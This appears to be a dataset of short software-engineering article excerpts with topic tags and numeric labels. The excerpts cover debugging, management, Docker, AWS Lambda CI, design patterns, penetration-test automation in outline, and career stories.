3417,"Once you got to the bottom of the unwanted behavior you can move towards addressing it. That might be a major effort as well, but its beyond the scope of this article. What Id like to emphasize here is the by product of the debugging process, which are new methods and tools you can use in the future to approach a similar situation. And its not something youve read about in a book, but something that you lived first hand. You went in pursue of the truth and found it.","['Debugging', 'Philosophy', 'Self Improvement', 'Understanding', 'Life Lessons']",9
3418,"How does a group lose its identity? When the group was established, it had a very well defined purpose and a great value as it was beneficial for the client. It was in charge of application hosting platforms and applications which were consequently hosted upon these platforms. After the final version of each of the developed products was released, the spiraling began. The group received projects that had nothing to do with its main purpose, they began supporting technical issues in order to help clients other than the main client, and worst of allthe group stopped releasing versions. Unfortunate managing choices have let the groups already bad reputationto deteriorate immensely. Its identity had been completely wiped out.","['Business Strategy', 'Software Development', 'Corporate Culture', 'Management And Leadership', 'Management Software']",16
3419,"During assignment planning, he received an assignment to organize the projects GIT. Up until that time, the GIT was a great big mess that consisted of two different project versions. Since the team lead (lets name him Steve for the sake of the example) was the most experienced senior developer, we all agreed it would be most effective if hed gotten the assignment, since it wouldve taken him the least amount of time and efforts. After a month, in which wed held a few status meetings where he spoke of his progress, we found out that not only did the GIT stay exactly the way it was, but he also ordered his team members to develop upon the older versionthus creating unnecessary integration problems. Everywhere elsea worker like that wouldve been immediately fired. Unfortunately, I could not fire him nor take any other disciplinary measure against him.","['Business Strategy', 'Software Development', 'Corporate Culture', 'Management And Leadership', 'Management Software']",12
3420,"This story with Steve reminded me of an employee I had as a regional manager for a non-profit organization a few years back. As a regional manager, I was in charge of managing my branch managers on the one hand and on the other handdeveloping our regions community and business relations. Suzy was one of my employees. In time, weve realized being a branch manager lead her to have a strong thirst for power. She took on many responsibilities, treated her branch co-managers as her employees, disrespected her co-workers and basically bossed everyone around. No one had the guts to stand up to her for years, because it was a voluntary job, and we didnt want her to use her rage against the organization. Every action had to be taken very delicately. Id tried changing the atmosphere, adding bonding activities and a few other approaches. When we saw nothing changed her behavior, I decided to take more drastic measures.","['Business Strategy', 'Software Development', 'Corporate Culture', 'Management And Leadership', 'Management Software']",0
3421,"Since I could not fire him, but could not keep him either, I started looking for a different position for him, far from my group. I gave him and his team fewer responsibilities and every new group member was forwarded to one of the other two teams. Throughout the process, I gave him performance feedback, hoping his behavior would change. His stubbornness and thirst for power prevented any change, and when he felt his power was slipping away he got angryand so weve reached a turning point. At this point, Steve and I finally had a shared interest. He wanted to seek power elsewhere, and I wanted him to seek power elsewhere. I knew he was one of the groups many setbacks, but I also knew that dealing with any other setback before I got rid of him would be futile.","['Business Strategy', 'Software Development', 'Corporate Culture', 'Management And Leadership', 'Management Software']",0
3422,"It is a method to perform some operations on an image, in order to get an enhanced image or to extract some useful information from it. It is a type of signal processing in which input is an image and output may be image or characteristics/features associated with that image.i OS developers use a number of different programming interfaces to render graphics on the screen. UIKit and App Kit have various image, color and path classes. Core Animation lets you move layers of stuff around. And working with graphics on a low level can get a bit tricky to process.","['iOS', 'Swift', 'Image Processing']",14
3423,"Now we rendered the scenery image over the canvas using draw method.iii) Apply Blur: Now we are going to blur the output image from the last method using core image filters. Core Image has the number of built-in filters. From that, we are using Gaussian Blur to blur the image. The filter mainly makes the changes on pixel data according to the radius value using Gaussian Distribution function. The CIImage type which has the information about the image. so we have to cast the input image to CIImage type and we have to pass the image in the filter with k CIInput Image Key key like below: Before creating a filter, we should create the context using CIContext to process/analysis the input image and rendering it.","['iOS', 'Swift', 'Image Processing']",14
3424,"Also, we are using a crop filter to crop the image with aspect image size after blurred the image. Then pass the output image from crop filter in this create CGImage(_: from:) method using created context will generate and return the CGImage.iv) Render Image over the blurred image with transparency: Now render the Luigi image over a blurred image like the second step with the required size and position. But here we rendering the image with transparency(with opacity). so we need to enable the opacity in UIGraphics Begin Image Context With Options method like below: And Use the method draw(in: blend Mode: alpha:) with blend mode and alpha value for transparency instead of draw(in:).v) Text Rendering: Basically, i OS has plain text which is defined as a string type and attributed string which is defined as an NSAttributed String type. We can define the basic properties like font name, size, weight etc. But NSAttributed String string which allows us to customize the text with its attributes to customize the text style, color, stroke color etc. String attributes are just a dictionary in the form of [NSAttributed String Key: Any].","['iOS', 'Swift', 'Image Processing']",14
3425,"Heres what each of the parameters mean:--restart always will restart this container any time Docker is started, such as on laptop reboot or if Docker gets shut down and started again. Leave this parameter out if you want to start your own containers every time.--name mysql8.0 assigns the name mysql8.0 to your container instance. Adding the version number to the instance name is handy if youre planning on running multiple versions in containers on your laptop.-v /usr/local/opt/mysql/8.0:/var/lib/mysql will bind the data folder location on the container volume (/var/lib/mysql) to the local folder you created on your laptop volume in the prior step, so that data will persist if the container gets shut down.-p 3306:3306 will bind the My SQL port of the container (3306) to a port on your local machine (3306). This will make things easier when treating this container as our new localhost.-d will run the container in detached mode, so that it runs in the background.-e MYSQL_ROOT_PASSWORD=your_password sets an environment variable, in this case the My SQL root password, inside the container.mysql:8.0 indicates the official Docker Hub My SQL version tag 8.0 is the one to install. Simply replace the :8.0 with a different version if youre creating a new instance (e.g. :5.7) and make sure youve created a data folder that matches (e.g./user/local/opt/mysql/5.7) so that you can keep everything straight! You can click here to checkout all of the available My SQL image versions on Docker Hub.","['Docker', 'MySQL', 'Macos']",7
3426,"Weve talked quite a bit about what Service-Oriented Architecture is and how it can be used to advance your business. But theres also Saa S (Software as a Service), which can also be used to advance your business. You may be wondering what Saa S is and how it differs from Service-Oriented Architecture. In brief, the resources available through Saa S are software applications. A key component is that the Saa S infrastructure is available to, but hidden, from users. An advantage of Saa S is that users dont have to both install and maintain software, which eliminates any complex requirements. With Saa S, the customer also doesnt require any up-front licensing, which leads to lower costs because providers are only maintaining a single application.","['Microservices', 'Software As A Service', 'Soa', 'SaaS', 'Software Engineering']",10
3427,"We can rely on user reports to learn more about minor bugs and security issues, but what happens when were working on large-scale systems that hold human lives in the intricacies of their code? Should we expect pilots to notice and report bugs or oversights in Boeings in-flight automation systems, or should software engineers be expected to conduct frequent, thorough testing and user outreach? Can we expect engineers to guess which features might need an additional set of eyes? Had pilots previously reported having difficulty controlling Boeing 737 aircrafts? Should those doctors have been indicted for murder if the error in administering the proper dose of radiation was in the code? Are we responsible for testing software as we intend it to be used, or as users might try to use it? Was there any way for the doctors to request a new feature in their radiation administration software instead of trying to bypass its restrictions? Are engineers responsible if users are able to tamper with software? Should we expect engineers (who specialize in software development) to identify and question oversights or missing/poorly implemented features that are requested by clients (who specialize in whatever the software will be used for)? How would a developer know that a doctor might try to do X with this software? Is there enough communication between developers and users of proprietary software? We can say that users are responsible for what they do with our software, but what happens when safety is on the line? Who is last in the line of defense?","['Technology', 'Software Development', 'Programming', 'Health', 'Future']",13
3428,"Were gonna give Docker a pause for now and talk a bit about our web application. As mentioned before, well be using the application to upload files to a server. If youve been following along up until now, youre probably wondering: if were gonna be running our application in a self-contained virtual environment; how are we gonna get our file on to a local machine? How are we gonna persist our data? Thanks to Docker, we have a solution. When you create a volume, it is stored within a directory on the Docker host. When you mount the volume into a container, this directory is what is mounted into the container. Effectively making it so that a directory on your local machine is accessible by the container.","['Docker', 'Aspnetcore']",7
3429,"Here, what were telling Docker is to copy everything from our previous build build-env located in /app/out to our container. Simply put, in our first stage we published our project and in our second stage we kept only the published files in our container. The only files that will be kept in our final image are the ones we kept in our second stage. Exposes port 80 on our container so we can effectively connect to our published site. And finally Configures the container to run as an executable.","['Docker', 'Aspnetcore']",7
3430,"Then run the following two commands: So whatre we doing here? The first command effectively builds our environment using the Docker File we defined before. The second command creates a container for our environment with the following parameters: -d to detach the container from the terminal and let it run in the background. -p 8000:80 to map port 8000 to port 80 on the container. --name to set its name to first Container. -v /temp:/ws_persist/ to create our volume; mapping /temp defined before in Virtual Box (directory path) to /ws_persist/ hardcoded save path in our project to our container. Finally, myapp is the last parameter to define what environment well be using for this container.","['Docker', 'Aspnetcore']",7
3431,"Our first step was to create the Lambda functions and API gateway manually, through the AWS console. While this is fine to explore the different configuration options and deploy a quick proof of concept, it doesnt scale. The process is error-prone; packaging and deploying Lambda functions manually is a pain, and configuring API Gateway is needlessly complicated when youre not familiar with the service. Even if you are, the terminology and arcane interface can still trip you up: I still dont know off the top of my head the difference between Method Request and Integration Request And where do you activate logs again? )So, once we understood our initial workflow and were comfortable with the basic architecture, we started looking at ways to automate it.","['AWS Lambda', 'Serverless', 'Continuous Integration']",10
3432,"What this means in practice is that you can take your existing Swagger file, complete it with a few x-amazon-apigateway-* descriptors, and just like that your API is deployed and integrated with your Lambda functions with all the correct models and behaviors. No need to worry ever again about how to use the API console Building on SAM, we built a complete Cloud Formation template describing our API integration, the Lambda functions, as well as the associated IAM roles, log rules and so on. We now had a way to update our entire stack, and even rebuild it from scratch if the need arose. Its also around this time that we finally threw in the towel and isolated our staging and production platforms in dedicated AWS accounts. Previously we had kept them both in the same account, using Lambda aliases and API stages to distinguish them. But it was becoming increasingly complicated to reason about the release cycle, when to change aliases or which stage should point to which version. Security and keeping the contexts isolated was also a big pain. So we followed AWS best practices and set up a separate account for production, as well as giving each developer their own account. Its not very expensive, since with a serverless architecture you only get billed for actual usage. And now that we could easily set up new environments by running our Cloud Formation scripts, we went nuts At this stage we only had one API, living in one repo, with all our deployment scripts and templates tucked away in a /infra directory. Then came the day when we started to work on a second APIWe graduated our CI code to its own repository and created a Docker image containing all the scripts and necessary tooling, while the configuration files stayed in the original repo.","['AWS Lambda', 'Serverless', 'Continuous Integration']",15
3433,"At this stage, about 3 months into building our platform,we used Cloud Formation to deploy and update our API gateway and the associated AWS infrastructure (IAM roles, Lambda functions, etc). We deployed our Lambda functions, including their dependencies and environment variables, using Apex. Apex hooks and custom shell scripts were used to run tests before and after deployment. All these scripts and tools were packaged in a Docker image. All neat and tidy and working well Youre guessing what comes next, right? Well, we didnt throw everything away, but we did make a lot of changes.","['AWS Lambda', 'Serverless', 'Continuous Integration']",10
3434,"Our response was not to stop the world, migrate everything and get back to it. We created new services, proxied to them from the existing load-balancer and gradually strangled the old application. We focused on demonstrating value: A/B testing the first version of our new service in production within the first week. We eventually started to organise teams around long-running products, filled with people from engineering, design, data science and other necessary disciplines. And the performance of the business responded.","['AWS', 'Kubernetes', 'Agile', 'Lean', 'DevOps']",6
3435,"There are a lot of things that are considered Java Script these days. Theres the open language described in the ECMAscript standard. There are adjacent languages like Type Script that offer niceties to coders in exchange for compatibility with the Java Script ecosystem. Theres the power of instant access to years of coding effort through package management tools like npm. There is a nearly-infinite amount of infrastructure around the language, and even more infrastructure using the language to provide build tools or automation for other languages. And then theres the ubiquity of Java Script being interpreted within the web browsers on billions of devices around the world.","['Programming', 'JavaScript', 'Network', 'Software Development']",9
3436,"These non-questions inspire all sorts of real, but confusing, questions. Are you supposed to change the weird code? How can I hope to figure out what you want me to do if you arent even sure yourself? Whats wrong with this implementation and what way would be better? It is not clear what you want to change and you come off as aloof and inscrutable.","['Code Review', 'Technology']",9
3437,"Also, there is an implication that telling people how to do something prevents them from learning. The first step to almost any good lesson is to model how to solve a problem. *The other suggestion is that people are asking lots of legitimate clarifying questions. If code is not understandable and you have made a good faith effort to understand it, asking a question is appropriate. Just make sure that you are not asking a question when you really ought to be stating an opinion about the code. Clarifying questions should only be needed in rare circumstances. *Also as a former Philosophy major, its my duty to remind you that Socrates made so many people angry with his communication style that he was sentenced to death. Not exactly the role model for healthy communication in an office.","['Code Review', 'Technology']",9
3438,"Control is not the right paradigm. The job is guidance, sometimes tight, sometimes loose. Sometimes the writing is flowing, sometimes it needs to coaxed and forced. The manager (a better word is producer) has to understand the creative process: what is needed? Your writers are deep in their code. Thats where you want them, and where they want to be. They are pulling on threads, discovering in language what needs to be built. The writing of the code requires that they, to some extent, lose sight of the purpose of the writing. Not because they dont care, or because they are irresponsible, but because they have to be able to be open to where the writing takes them.","['Software Engineering', 'Software Development', 'Management', 'Leadership', 'Agile']",12
3439,Your job is to balance loose and tight process. Deadlines at the expense of a brilliant burst of creativity arent. Too much brainstorming moves away from the real work. A small team working with only a notional idea of a goal may produce terrific results. A large team without a clear destination will fail.,"['Software Engineering', 'Software Development', 'Management', 'Leadership', 'Agile']",0
3440,"Lots of boilerplate So how is Flux different from Clean? The Flow of the app is essential to Flux and there are very strict rules that are enforced by the Dispatcher. In Clean the flow isnt enforced and most Clean patterns implement it differently Unidirectional flow: Every change goes through the dispatcher. A store cant change other stores directly. Same applies for views and other actions. Changes must go through the dispatcher via actions. In Clean its very common to have bidirectional flow Stores dont need to model anything and can store any application related state. In Clean models try to model something, usually single objects Mini is a minimal Flux architecture written in Kotlin that also adds a set of useful features to build UIs fast.","['Flux', 'Android', 'Architecture', 'Kotlin', 'Software Development']",19
3441,"During a follow-up session the government official stated: There has been a 10% dumping increase ever since the app launched. We believe citizens are abusing it to get rid of their trash. The team was stunned, they just couldnt believe what they heard. Offenders are clearly not engaged with the community, so why would they bother using the app? Initially the team started to compile a list of arguments against the officials reasoning. Unfortunately, there was no evidence to decide one way or another. But then they realised, at this point, it didnt matter. There was a far more important lesson learned. The team was measuring the solution, app usage, but had not been informed about the actual goal.","['Product Management', 'Software Development', 'Agile', 'Roadmaps', 'Retrospectives']",17
3442,"The solution is often only one option out of many. It is tempting to use lessons learned to try to improve that one solution, while actually it is more valuable to reflect on lessons learned in the light of the targeted goal. Hence it is important to realize the solution is only a tool, a means to an end. If you dont have the right tool for the job, you should switch tools. Surprisingly, we often look to improve the tool and forget about the job to be done. The main question should be what did we learn about the goal were chasing and the current strategy were trying to approach it.","['Product Management', 'Software Development', 'Agile', 'Roadmaps', 'Retrospectives']",4
3443,"When guiding a team through lessons learned sessions its easy to get overwhelmed. The first time it took me several sessions and some headaches to finally compile a list of lessons learned that had true insights on goal and strategy. Questioning how and why is not an easy thing to do. Here are some guiding principles that have helped the teams Ive worked with to deliver breakthrough solutions: Identify doubts and disagreements. Screen the plan and get to the underlying causalities. Does the team agree on facts and assumptions? Where did we take the biggest leap of faith? Other initiatives, customers, and events often provide valuable information to examine if the teams strategy is still valid. The coffee machine is for me a PM hotspot to get a lead on interesting facts that might be valuable to the teams journey.","['Product Management', 'Software Development', 'Agile', 'Roadmaps', 'Retrospectives']",0
3444,"Have you ever heard the phrase Levels of Abstraction [1] meaning that not all abstractions are created equal? In my previous article we discussed that abstractions have no inner structure, they are indivisible atoms, dots on a bigger diagram. So how is that possible that some of these dots could be more abstract than the others? Well, its not about abstractions per se. Its all about domain knowledge and the context in which these abstractions are organized into bigger picture that we call Software Architecture. In one context an abstraction could be at the very heart of the Architecture and in the other context the same abstraction is just a dirty detail nobody cares about.","['Software Development', 'Uml', 'Software Architecture', 'Software Design', 'Software Design Patterns']",9
3445,"Let me give you an example. Lets say you are an architect of an accounting system. There will be abstractions representing Debit and Credit at the center of your Architecture. Most probably there also will be abstractions representing ORM (object-relational mapping) but these are just implementation details related to data persistence. One day if you decide to change relational database to No SQL these ORM-related abstractions would be gone, but your system is going to be just fine. Contrarily, if the very concept of money goes out of humanitys favor your system has no reason to exists any longer together with Debit and Credit abstractions.","['Software Development', 'Uml', 'Software Architecture', 'Software Design', 'Software Design Patterns']",9
3446,"First of all, Dependency Injection is not the only way to implement Inversion of Control. Another famous example would be Plugin Architecture [5]. Lets say we have some Engine and its behavior could be extended by Plugins. All Plugins implement an interface exposed by Engine thus for every Plugin there exists is relation from that Plugin to Engine contents. Yet Execution Control flows in the opposite direction, from Engine to Plugins. Thus, Plugin Architecture is an example of Inversion of Control without Dependency Injection.","['Software Development', 'Uml', 'Software Architecture', 'Software Design', 'Software Design Patterns']",18
3447,"Architectural Boundary is an important concept defining Software Architecture which deserves its own place in No UML. In this article we have seen how Architectural Boundaries shape architecture of Software Systems. Smalltalk Best Practice Patterns, 1st ed., 1996. Principles of Package Design: Creating Reusable Software Components, 1st ed., 2018, p. The Clean Architecture, 1st ed., 2012, p. [5] Martin Fowler, David Rice, Matt Foemmel. Patterns of Enterprise Application Architecture, 1st ed., 2003, p. [6] Grady Booch, James Rumbaugh, Ivar Jacobson. The Unified Modeling Language User Guide, 1st ed., 1998, p 225238.","['Software Development', 'Uml', 'Software Architecture', 'Software Design', 'Software Design Patterns']",12
3448,"The thing that propelled me the most with freecodecamp was that in order to earn their certificates, you needed to complete all the courses, algorithm challenges, and build projects that would be reviewed by others, and verifiable. Knowing that I had to complete the projects motivated me tremendously. While working on those projects, I refined my skills as a developer, and began to feel like I was moving forward. Sadly, while trying to complete my coding projects, I started to get really discouraged. I was getting scared that I would end up chasing down tutorial after tutorial, by myself, only to never get to the next level I needed to get to. I found myself getting distracted by new things to learn, and never really sitting down to focus on what needed to be done. In a way, I kinda felt like I hit a wall, like in Run, Fatboy, Run.","['Software Development', 'Freecodecamp', 'Technology', 'Career Change', 'Software Engineering']",2
3449,"Up until this point, I was still working at KPMG. My time was split between family, work, church responsibilities, and learning how to code. I wasnt getting anywhere with my unfocused, sporadic job search either. I only had applied to maybe 2 jobs. I ended up calling a friend who referred me to someone he knew that also went the self taught route to their career in coding. He prompted me to consider a bootcamp, which his own company had hired graduates from, and said they seemed pretty promising.","['Software Development', 'Freecodecamp', 'Technology', 'Career Change', 'Software Engineering']",2
3450,"I quit my job, and 5 days later, started the course on Dec 12, 2016. I was off to the races. Hack Reactor was great for me. The curriculum covered so many different concepts. There were daily algorithm questions, lectures to watch and read, assignments to complete, presentations to prepare for, and four projects to build from scratch. And all of it was structured and paced around pair programming with other students.","['Software Development', 'Freecodecamp', 'Technology', 'Career Change', 'Software Engineering']",2
3451,"So, when the course was over, I followed their job search advice, and ended up applying to 5 jobs a day. I kept that cadence for about a month before anyone contacted me. But I knew I had done quality work that I could show employers, and that I shouldnt be ashamed of my less conventional means of acquiring my skills. Once I started my second month of job searches, things picked up. I started getting emails and phone calls back. Many were just rejections, which was better than being ghosted. But the few that ended up being phone screens were helpful, and gave me a tiny taste of what to expect as I continued to apply.","['Software Development', 'Freecodecamp', 'Technology', 'Career Change', 'Software Engineering']",2
3452,"Its been around 18 months since I started at Pay Pal, and I couldnt be happier. I often tell people that the change from my old job in public accounting to a software engineer is night and day . Instead of auditing all day I get to build software that anyone can interact with! I get to solve interesting problems that satisfy my thinking itches! I have the freedom to think of new possibilities and pursue them! Since starting at Pay Pal, my wife, friends, and family noticed I was much happier. I was able to see and play with my daughter more. My wife and I began spending more time together. I had more time to do my share of the house work. We even had another baby girl! And the best partto this day I havent felt any dread from the thought of going into work.","['Software Development', 'Freecodecamp', 'Technology', 'Career Change', 'Software Engineering']",2
3453,"With the GQM structure in place, we had to find a way to collect the metrics, in an automated way. We have tools to extract code metrics, but we will not discuss them in this post. Rather, we will focus on the following 2 higher-level metrics, which are harder to collect:the percentage of REST endpoints still used in usage scenariosthe percentage of code covered when going through scenarios To collect the data, we designed a system for recording usage scenarios. The system generates log files that link every scenario to a list of endpoints, and to a list of executed methods. For instance, we can use the system to record the Create invoice scenario. The system generates metadata that links the scenario to 3 REST endpoints and 12 methods.","['Software Engineering', 'Software Development', 'Metrics', 'Refactoring', 'Agile']",8
3454,"We illustrated in the beginning why it is important that a software developer can quickly check if a suspected security issue is present in the system. While this could be facilitated with a simple collection of Postman scripts, the requirements above motivated us to take it a few steps further than that. On a technical level, penetration testing infrastructure we build should act like a malicious client in order to verify that it cannot do any harm. It should be employed to test the entire system and the interplay of the components it is made of. Moreover, it must be integrated in our CI infrastructure: We should be able to quickly create a test case that serves as an automated and reproducible indicator for security issues. The test case should run quickly and often, and should instantly show the result in all tests passed-green or uhh, theres an issue-red.","['Software Development', 'Penetration Testing', 'Security']",13
3455,"In this section we want to show you how we use Behave to address our individual requirements to a penetration testing infrastructure. Starting at the top, the business description of a (simplified, imaginary) flaw looks something like this in Gherkin syntax: This description does not differ from any BDD scenario specification as it would used in integration testing. Of course, instead of only ""Alice"" cannot access the profile of ""Bob we would also want to test ""Alice"" can access the profile of ""Alice"". However, compared to implementing this check directly as a part of our back-end's test infrastructure, developers need much less background knowledge about the internals of the back-end. The back-end can largely be treated as a black box and the tester can concentrate on playing the evil client. In our specific case at ne Xenio this helped a lot to encourage and facilitate our front-end developers to specify scenarios and implement the steps.","['Software Development', 'Penetration Testing', 'Security']",13
3456,"Maybe you noticed the users dictionary that appears somewhat magically in the snippet above. Admittedly, the code is simplified a little bit for readability, but it is a good example how the BDD approach helps us to implement test cases more quickly. Behave allows us to specify fixtures to run before and after scenarios. We use them to automate test setup and tear-down tasks. Before each scenario, for example, user objects are created and placed in the users dictionary. Similar to the step spelled out above, the [.] is a registered user -steps will reach into this dictionary for the appropriate user object and make sure the user is registered. After each scenario, users and other artifacts of our tests are removed again so the system is left in a clean state. As a result, the code for test setup and tear-down can easily, almost implicitly, be reused.","['Software Development', 'Penetration Testing', 'Security']",15
3457,,"['Open Source', 'Hacktoberfect', 'Skill A Month', 'Github']",16
3458,"A design pattern is a way of structuring code to solve a specific problem. The aim is always to make use of solutions to common problems and make code more elegant and flexible. Design patterns do not require knowledge of any complex or obscure code to be able to use them. But knowing how to use the right design pattern in the right situation will make you a much better programmer. Often, using a design pattern will make the code simpler, shorter, and more elegant, by allowing it to be reused in other places.","['Android', 'Design Patterns', 'Java', 'Performance', 'Software Architecture']",9
3459,Creational design patterns are used to abstract the process of instantiating objects. They are used in scenarios when a system should not be dependent on how objects are created. One example could be a game that lets you build houses. It would not be practical to have one long class that has all the code for making each different type of room and all the items in the room. It would be much better to encapsulate the code for creating the objects in separate ways. There are lots of creational design patterns that could be applied to this game. Creational design patterns become more important as systems become more complex.,"['Android', 'Design Patterns', 'Java', 'Performance', 'Software Architecture']",9
3460,"Builder pattern is to avoid having complex constructors. In general, you should avoid having a constructor that takes a large number of parameters. Long lists of parameters are confusing and do not give you much flexibility when creating a class. Consider the case of a class representing a person. Each new person created will have a unique combination of characteristics. For example, each person will have a name, age, hair color, eye color, occupation, nationality, and so on and so forth. In a Java application, every time a person was created, all of this information would have to be passed into the constructor.","['Android', 'Design Patterns', 'Java', 'Performance', 'Software Architecture']",9
3461,"This is a very long list that needs to be supplied, and it is easy to see how items might be put in the wrong order. There might also be times in the application where not all of the information is needed. You might need to create a person but only want to specify their name. To create a person you would still have to supply all of the other information about their hair color, nationality, current city, etc. One way to fix this problem is to have multiple constructors. They could be one that takes all the parameters and another that takes just the name.","['Android', 'Design Patterns', 'Java', 'Performance', 'Software Architecture']",15
3462,"Then if one was needed there could be another constructor that takes just the first two parameters, name and age. Then there could be one that takes the first three and then the first four and so on until all the parameters are added. This technique is called the telescoping constructor pattern. The problem with this technique is the class ends up having a very large number of constructors. There may be times when you want to specify other combinations, for example, just nationality and date of birth. To have a constructor for every possible combination of eight parameters there would be 254 different constructors.","['Android', 'Design Patterns', 'Java', 'Performance', 'Software Architecture']",9
3463,This solution does work and there would be a great amount of flexibility in creating person objects. But the person class would be extremely long and complex just from the number of constructors. It would take a long time to write all those codes and it would be difficult for other people to read and understand. The builder pattern is a much better alternative to solving this problem. It keeps all the flexibility of the telescoping approach but without the complexity. It moves the construction of complex objects out of the constructor. It also allows for different combinations of fields with one single construction process.,"['Android', 'Design Patterns', 'Java', 'Performance', 'Software Architecture']",9
3464,"It can make the application faster, as well as make the code shorter and cleaner. If the prototype pattern is used and an original rabbit is copied. The copied rabbits can then be modified. For example, you could clone the original rabbit 10 times, and then give all of the rabbits their own name. This pattern should be used when the application using the cloned objects should not need to know about how an object is created. It is also useful when classes are loaded dynamically.","['Android', 'Design Patterns', 'Java', 'Performance', 'Software Architecture']",9
3465,It is not the job of the store to get involved with exactly how the candy is created. The solution to this problem is to usethe factory method pattern. This involves adding an extra class between the candy store and the candy. This class has something called a factory method which handles deciding which class to return. This means that all the code that decides which candy to make is moved out of the candy store and into the candy factory. This makes it much easier if the owner of the shop wants to start selling new types of candy.,"['Android', 'Design Patterns', 'Java', 'Performance', 'Software Architecture']",9
3466,"In that case, the code in the candy store class does not need to be changed at all anymore. Instead, the candy factory class worries about all of this for us. This makes the code much more maintainable. If the factory pattern was not used,the code would be much more difficult to maintain. There could be a class called candy store and then an abstract class called candy. Then, each different type of candy could be a concrete implementation of the abstract candy class. The store needs a way to get the candy.","['Android', 'Design Patterns', 'Java', 'Performance', 'Software Architecture']",9
3467,"The problem is the candy store class needs to create candy objects, as it cannot create them because candy is an abstract class. You cannot instantiate an abstract class in Java. But the store just needs to know that it sells different types of candy. It doesnt need to know about all of the different kinds of candy available in the world. In this scenario, the only way to create a candy object in the candy store class is to specify what type of candy it is. One solution is to have a method with lots of if statements. For example, if the candy is in the chocolate section, create a chocolate bar;if its in the lollipop section, create a lollipop.","['Android', 'Design Patterns', 'Java', 'Performance', 'Software Architecture']",9
3468,"Abstract Factory Pattern provides an interface for creating families of objects without specifying what their concrete types are. It should be used when there is a system that creates objects, but how those objects are created should be hidden from view. In particular, it is used when applications have families of objects. The application should be able to choose which of a selection of families it wants to use. The abstract factory pattern can ensure that family groups are used together. Say, for example, there is an application that builds bicycles.","['Android', 'Design Patterns', 'Java', 'Performance', 'Software Architecture']",9
3469,"First, all of the individual bike parts need to be built. The wheels, handlebars, gear and frame, and so on, need to be made, and not just any old parts. To make a mountain bike, for example, you need wheels with a strong frame and thick tires. Mountain bikes also need straight handlebars, so these different parts are examples of a family of objects that need to be made together. The process of making a mountain bikeis different to making a road bike, which has different wheels, gears, handlebars and so on. It would be wrong to mix up any of the parts for the two bikes.","['Android', 'Design Patterns', 'Java', 'Performance', 'Software Architecture']",12
3470,"If the road bike had a mountain bike wheel, it would not work very well. Both types of bikes have the same kinds of parts,i.e., they both have wheels, but the actual parts themselves are different. This can be complex when it comes to representing a bike builder in Java code. A constraint of a bike builder class is that it does not want to hard code the parts when a specific bike is built. This would be inflexible and lead to long and complex code all in one place. If any changes needed to be made to how a specific type of bike part is built, this code would need to change again.","['Android', 'Design Patterns', 'Java', 'Performance', 'Software Architecture']",9
3471,"This way, the bike builder does not need to know about how the different parts are made because the concrete classes are isolated from it. If the bike builder is using a Mountain Bike Factory class, it cannot create any parts other than a mountain bike part. If it asks for a wheel, a mountain bike wheel is created and returned. There is no need to specify that a mountain bike wheel is needed,because the abstract factory already knows and deals with that. This is a much better way to structure the code.","['Android', 'Design Patterns', 'Java', 'Performance', 'Software Architecture']",9
3472,"The Dev Ops movement has helped us mature as an industry. Ad-hoc manual tasks are now automated, and were moving toward an everything-as-code approach. Infrastructure provisioning is codewere even moving toward translating operations routines into code. Long story short, we now create a lot of code around our application source code.","['DevOps', 'Kubernetes', 'Jenkins', 'Knative', 'Gitops']",10
3473,"The next core concept in keptn is uniforms. Shipyard files define what you want to do, but not which components are to be used. This is what uniforms are for. A uniform defines which tools are used to implement the functionality defined in shipyard files. You can specify that a standard Git Ops provider or a solution like weave cloud be used. And you can specify that your continuous delivery solution is to be an Argo, Spinnaker, or AWS code pipeline. You can also specify which Kubernetes distribution you want to use Openshift, Google Kubernetes Engine, or other.","['DevOps', 'Kubernetes', 'Jenkins', 'Knative', 'Gitops']",7
3474,"Ever wondered why that brilliant idea of yours fell on deaf ears? According to you, it seemed like the perfect feature or product your team should build. Yet, it failed to make a mark. But, next time you have a crazy idea like that, do your homework and make it a reality.","['Product Management', 'Ideas', 'Work', 'Engineer', 'Data']",12
3475,"I see tons of engineers with tons of ideas but fail to take it forward for several reasons. Here are top 5 things that you should dive deep into to give your idea that real push.1. Clearly define customer problem Clearly, irrespective of the idea you have, theres a customer problem behind it that led you to the idea in the first place. Understanding and defining the problem for your audience is key. Break up the problem, if possible for both new and existing customers. For example, if you are re-designing a search page, the problem could be new customers see a blank page and you may want to solve that by guiding them with popular content. On the other hand, existing users might see recent searches and your idea could be to show personalized content. If you have clarity, your audience will too.2. List business value or impact First and foremost, know your companys success metrics. How does your company measure success? For example, if its customer engagement, then how will your idea help increase it. Think of other business values your idea brings Maybe its a new way to discover content for your customers or perhaps brings flexibility for your marketing team to program content. Support your idea with data Data is king! Old saying, still holds true if you do it right. Once you have your idea, work backwards. Dig up data supporting your idea. Back to the example of re-designing a search page Are there enough customer visits to the search page for you to invest in the idea? If yes, what are they searching for? At times, it may be difficult to dig up the right data, be creative at finding ways around it by conducting your own surveys or researching the web.4. Go through the backlog Your backlog is an abundant source of ideas and its very likely your idea is somewhere on that list. It just did not get prioritized. That should not stop you, instead look deeper as to why it wasnt prioritized and how your idea can help make a stronger case to justify its need. In fact, if you are out of ideas, start by looking at the backlog.5. Think of the MLPMLPMinimum Lovable Product. How would you implement your idea with minimum resources and time and still manage to surprise your customers? Tough one to answer, but start thinking about the MLP as it will go a long way to get your idea across the board.","['Product Management', 'Ideas', 'Work', 'Engineer', 'Data']",0
3476,"Of course, many business owners may think that it is impossible to set and reach deadlines in the process of cooperation with the remote web developers. They think that if a person is working remotely he/she can be the reason for the project failure, but of course, its an old-fashioned prejudice. The reason of the project failure in the most cases is in the communication gaps, which may exist even in the office teams and misunderstanding of the tasks on both sides (SMT side and the employee side). It has nothing to do with the remote team members. The most important part in such case is to create procedures and manuals, set up communication channels, check on a regular basis the changes and developments of the project, provide feedback on time,communicate your expectations effectively. Yes, it may seem weird, but not every manager can really communicate his/her expectations effectively and in the most cases web developerclient relationships come to an end due to the basic personal misunderstanding on both sides.","['Remote Working', 'Business', 'Web Development', 'Freelancing', 'Management']",0
